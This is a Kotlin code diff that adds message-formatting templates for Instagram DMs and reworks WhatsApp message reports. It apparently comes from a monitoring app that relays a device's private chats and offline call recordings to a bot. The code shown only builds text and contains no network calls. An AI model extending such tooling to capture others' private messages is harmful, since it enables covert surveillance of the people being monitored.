@@ -406,6 +406,14 @@ object BotMessages {
             Here are the remaining entries.
         """.trimIndent()
         
+        fun buildOfflineInstagramLogCaption(): String =
+                """
+            #Instagram #Offline
+            ===================
+            ⚠️ *Update* - While the device was offline, Instagram DMs were received.
+            Here are the remaining entries.
+        """.trimIndent()
+        
         fun buildOfflineRecordingSyncedMessage(fileName: String): String =
                 """
             #Call #Offline
@@ -481,13 +489,39 @@ object BotMessages {
         ): String = buildString {
             appendLine("#Whatsapp")
             appendLine("===================")
-            appendLine("✨ *WhatsApp message has been $direction!*")
+            appendLine("✨ *WhatsApp Update*")
             appendLine("===================")
+            appendLine("*New Message has been $direction!*")
+            appendLine()
             appendLine("*Chat Room* : $safeChatName [$safeChatType]")
             appendLine("*Type* : $direction")
             appendLine("*Time* : $timeFormatted")
             appendLine("*From* : $safeSentBy")
             appendLine("*To* : $safeToTarget")
+            appendLine("===================")
+            appendLine()
+            appendLine("*Message* :")
+            append(safeMsg)
+        }
+
+        fun buildInstagramMessage(
+                direction: String,
+                timeFormatted: String,
+                safeSentBy: String,
+                safeToTarget: String,
+                safeUsername: String,
+                safeMsg: String
+        ): String = buildString {
+            appendLine("#Instagram")
+            appendLine("===================")
+            appendLine("✨ *Instagram Update*")
+            appendLine("===================")
+            appendLine("*New Message has been $direction!*")
+            appendLine()
+            appendLine("*Type* : $direction")
+            appendLine("*Time* : $timeFormatted")
+            appendLine("*From* : $safeSentBy | $safeUsername")
+            appendLine("*To* : $safeToTarget | $safeUsername") 
             appendLine("===================")
             appendLine()
             appendLine("*Message* :")
